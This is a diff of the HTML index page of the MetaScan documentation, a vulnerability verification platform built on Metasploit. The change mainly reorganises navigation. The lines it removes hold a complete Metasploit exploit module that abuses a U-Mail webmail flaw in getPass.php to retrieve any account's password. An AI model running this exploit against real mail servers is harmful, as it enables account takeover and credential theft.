@@ -25,7 +25,7 @@
     <script type="text/javascript" src="_static/doctools.js"></script>
     <script type="text/javascript" src="_static/translations.js"></script>
     <link rel="top" title="MetaScan 0.0.1 文档" href="#" />
-    <link rel="next" title="简介" href="introduce.html" /> 
+    <link rel="next" title="快速入门" href="introduce.html" /> 
   </head>
   <body role="document">
     <div class="related" role="navigation" aria-label="related navigation">
@@ -35,7 +35,7 @@
           <a href="genindex.html" title="总目录"
              accesskey="I">索引</a></li>
         <li class="right" >
-          <a href="introduce.html" title="简介"
+          <a href="introduce.html" title="快速入门"
              accesskey="N">下一页</a> |</li>
         <li class="nav-item nav-item-0"><a href="#">MetaScan 0.0.1 文档</a> &raquo;</li> 
       </ul>
@@ -48,79 +48,19 @@
             
   <div class="section" id="metascan">
 <h1>欢迎使用MetaScan开发文档<a class="headerlink" href="#metascan" title="永久链接至标题">¶</a></h1>
+<p>MetaScan漏洞验证平台是基于Metasploit框架。</p>
 </div>
 <div class="section" id="id1">
-<h1>快速入门<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h1>
-<p>示例代码如下:</p>
-<div class="highlight-python"><div class="highlight"><pre>#encoding:utf-8
-require &#39;msf/core&#39;
-class Metasploit3 &lt; Msf::Exploit::Remote
-  Rank = ExcellentRanking
-  include Msf::Exploit::Remote::HttpClient
-
-  def initialize(info={})
-    super(update_info(info,
-        &#39;Name&#39;           =&gt; &quot;U-Mail System Unauthorized Access Vulnerability&quot;,
-        &#39;Description&#39;    =&gt; %q{
-          U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。
-        },
-        &#39;License&#39;        =&gt; MSF_LICENSE,
-        &#39;Author&#39;         =&gt;
-          [
-          &#39;Rain&#39;    #Metasploit-CNNS
-        ],
-        &#39;Platform&#39;        =&gt; [ &#39;php&#39; ],
-        &#39;Arch&#39;           =&gt; ARCH_PHP,
-        &#39;Targets&#39;        =&gt;[[ &#39;U-Mail&#39;, { }]],
-        &#39;Privileged&#39;     =&gt; false,
-        &#39;DisclosureDate&#39; =&gt; &quot;Apr 11 2011&quot;,
-        &#39;DefaultTarget&#39;  =&gt; 0))
-    register_options(
-      [
-        OptString.new(&#39;RHOST&#39;, [true, &#39;The DOMAIN&#39;, &#39;&#39;]),
-        OptString.new(&#39;RPORT&#39;, [true, &#39;The port&#39;, &#39;80&#39;]),
-        OptString.new(&#39;TARGETURI&#39;, [true, &#39;The base path to U-Mail&#39;, &#39;/webmail/&#39;]),
-        OptString.new(&#39;EMAIL&#39;, [true, &#39;The email to U-Mail&#39;, &#39;&#39;]),
-      ], self.class)
-  end
-
-  def exploit
-    begin
-        res = send_request_cgi( {
-            &#39;method&#39; =&gt; &quot;GET&quot;,
-            &#39;uri&#39;    =&gt; normalize_uri(datastore[&#39;TARGETURI&#39;]) + &quot;/getPass.php?update=s&amp;email=#{datastore[&#39;EMAIL&#39;]}&quot;
-          }, 20)
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-    rescue ::Timeout::Error, ::Errno::EPIPE
-    end
-      body_data = res.body.force_encoding(&#39;UTF-8&#39;)
-      if body_data =~ /你的密码是/
-        data = body_data.scan(/你的密码是\&lt;\/p\&gt;\&lt;p\&gt;\&lt;center\&gt;\&lt;font color=red\&gt;(.*?)\&lt;\/font\&gt;/)
-        if data and data.first and data.first.first
-          print_good(&quot;---------账号--------\n邮箱 = #{datastore[&#39;EMAIL&#39;]}, 密码 = #{data.first.first}&quot;, &quot;good&quot;)
-        else
-          print_error(&quot;漏洞利用失败！&quot;)
-        end
-      else
-        print_error(&quot;漏洞利用失败！&quot;)
-      end
-  end
-end
-</pre></div>
-</div>
+<h1>目录<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h1>
 <div class="toctree-wrapper compound">
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="introduce.html">简介</a></li>
+<li class="toctree-l1"><a class="reference internal" href="introduce.html">快速入门</a></li>
+<li class="toctree-l1"><a class="reference internal" href="example.html">模板代码</a></li>
+<li class="toctree-l1"><a class="reference internal" href="flow.html">使用流程</a></li>
+<li class="toctree-l1"><a class="reference internal" href="define.html">相关定义</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question.html">问题反馈</a></li>
 </ul>
 </div>
-</div>
-<div class="section" id="indices-and-tables">
-<h1>Indices and tables<a class="headerlink" href="#indices-and-tables" title="永久链接至标题">¶</a></h1>
-<ul class="simple">
-<li><a class="reference internal" href="genindex.html"><span>索引</span></a></li>
-<li><a class="reference internal" href="py-modindex.html"><span>模块索引</span></a></li>
-<li><a class="reference internal" href="search.html"><span>搜索页面</span></a></li>
-</ul>
 </div>
 
 
@@ -132,13 +72,12 @@ end
   <h3><a href="#">內容目录</a></h3>
   <ul>
 <li><a class="reference internal" href="#">欢迎使用MetaScan开发文档</a></li>
-<li><a class="reference internal" href="#id1">快速入门</a></li>
-<li><a class="reference internal" href="#indices-and-tables">Indices and tables</a></li>
+<li><a class="reference internal" href="#id1">目录</a></li>
 </ul>
 
   <h4>下一个主题</h4>
   <p class="topless"><a href="introduce.html"
-                        title="下一章">简介</a></p>
+                        title="下一章">快速入门</a></p>
   <div role="note" aria-label="source link">
     <h3>本页</h3>
     <ul class="this-page-menu">
@@ -170,7 +109,7 @@ end
           <a href="genindex.html" title="总目录"
              >索引</a></li>
         <li class="right" >
-          <a href="introduce.html" title="简介"
+          <a href="introduce.html" title="快速入门"
              >下一页</a> |</li>
         <li class="nav-item nav-item-0"><a href="#">MetaScan 0.0.1 文档</a> &raquo;</li> 
       </ul>
